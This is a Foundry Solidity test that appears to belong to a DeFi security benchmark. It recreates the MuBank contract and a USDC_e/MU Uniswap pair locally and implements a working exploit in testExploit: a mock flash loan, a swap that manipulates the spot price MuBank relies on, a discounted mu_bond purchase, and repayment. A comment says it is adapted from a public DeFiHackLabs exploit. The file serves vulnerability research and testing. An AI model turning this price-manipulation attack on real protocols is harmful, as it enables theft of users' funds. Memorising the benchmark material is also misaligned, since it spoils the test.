// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";
import "@utils/USDC_e.sol";
import "@utils/QueryBlockchain.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

import "benchmarks/realworld/MUMUG/MuBank.sol";

contract MUMUGTest is Test, BlockLoader {
    MuBank bank;
    ERC20Basic mu;
    USDC_e usdc_e;
    // USDC_e to MU
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;

    // Load from cheats.createSelectFork("Avalanche", 23435294);
    uint256 totalSupplyUSDC_e = 193102891951559;
    uint256 totalSupplyMU = 1000000000000000000000000;

    uint112 reserve0 = 110596398651;
    uint112 reserve1 = 172739951491310439336991;
    uint32 blockTimestampLast = 1670632626;
    uint256 kLast = 19102449214934407600169207587014640;
    uint256 price0CumulativeLast =
        308814746138342549066779453499621908384171319637193787;
    uint256 price1CumulativeLast = 108977737583418847522328147893;

    uint256 pairBalance0 = 110596398651;
    uint256 pairBalance1 = 172739951491310439336991;

    uint256 bankBalanceMU = 100000 * 10e18;

    function setUp() public {
        // Initial Tokens
        // Dont change the order of contract initialization.
        mu = new ERC20Basic(totalSupplyMU);
        usdc_e = new USDC_e();

        emit log_named_address("USDC Address", address(usdc_e));
        emit log_named_address("MU Address", address(mu));
        emit log_string("");

        // Initial Uniswap;
        pair = new UniswapV2Pair(
            address(usdc_e),
            address(mu),
            reserve0,
            reserve1,
            blockTimestampLast,
            kLast,
            price0CumulativeLast,
            price1CumulativeLast
        );
        deal(address(usdc_e), address(pair), pairBalance0);
        deal(address(mu), address(pair), pairBalance1);
        address[4] memory pairs = [
            address(pair),
            address(0),
            address(0),
            address(0)
        ];
        factory = new UniswapV2Factory(address(0xdead), pairs);
        router = new UniswapV2Router(address(factory), address(0xdead));

        // Initial Bank
        bank = new MuBank(address(router), address(pair), address(mu));
        deal(address(mu), address(bank), bankBalanceMU);

        vm.label(address(bank), "Bank");
        vm.label(address(mu), "MU");
        vm.label(address(usdc_e), "USDC_e");
        vm.label(address(router), "Router");
        vm.label(address(pair), "Pair");
    }

    function self() public pure returns (address) {
        return 0x3D87AD5D1686e240aBA58775a76B376d5CddDA3B;
    }

    function print(string memory tips) public {
        emit log_string(tips);
        address attacker = self();
        address pair_ = address(pair);
        address bank_ = address(bank);
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(usdc_e), attacker, usdc_e.decimals());
        queryERC20BalanceDecimals(address(mu), attacker, mu.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(address(usdc_e), pair_, usdc_e.decimals());
        queryERC20BalanceDecimals(address(mu), pair_, mu.decimals());
        emit log_string("");
        emit log_string("Bank Balances: ");
        queryERC20BalanceDecimals(address(usdc_e), bank_, usdc_e.decimals());
        queryERC20BalanceDecimals(address(mu), bank_, mu.decimals());
        emit log_string("");
        emit log_string("");
    }

    function flashLoanBorrow(uint256 amount) internal {
        deal(address(mu), self(), amount);
    }

    function flashLoanPayback(uint256 amount) internal {
        mu.transfer(address(0xdead), amount);
    }

    function swapUSDCToMUByPair(uint256 sendAmount) internal {
        usdc_e.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(usdc_e);
        path[1] = address(mu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sendAmount,
            1,
            path,
            self(),
            block.timestamp
        );
    }

    function swapMUToUSDCByPair(uint256 sendAmount) internal {
        mu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(mu);
        path[1] = address(usdc_e);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sendAmount,
            1,
            path,
            self(),
            block.timestamp
        );
    }

    function swapUSDCToMUByBank(uint256 sendAmount) internal {
        usdc_e.approve(address(bank), type(uint).max);
        bank.mu_bond(address(usdc_e), sendAmount);
    }

    function testExploit() public {
        // This attack is different from the original one:
        // https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MUMUG_exp.sol
        // I de-couple two attacks from it.
        vm.startPrank(self());
        print("Before exploit: ");

        // Step 1, mock to flashloan MU.
        uint256 paybackAmount = mu.balanceOf(address(bank)) * 99 / 100;
        uint256 flashloanAmount = paybackAmount * 997 / 1000;
        flashLoanBorrow(flashloanAmount);

        // Step 2, swap MU to USDC_e at uniswapPair, it will manipulate the price of MU/USDC_e in MU bank.
        uint256 swapAmount = mu.balanceOf(self());
        swapMUToUSDCByPair(swapAmount);

        print("After swap1: ");

        // Step 3, do the manipulated sell of MU.
        uint256 sendAmount = 950 * 10e18;
        uint256 muAmount;
        (, muAmount) = bank.mu_bond_quote(sendAmount);
        swapUSDCToMUByBank(sendAmount);

        print("After swap2: ");

        // Step 4, payback the flashloan.
        require(
            muAmount >= paybackAmount,
            "MU token isn't enough to payback flashloan!"
        );
        require(
            muAmount < mu.balanceOf(address(bank)),
            "MU token isn't too many!"
        );
        flashLoanPayback(paybackAmount);

        print("After exploit: ");
        vm.stopPrank();
    }
}
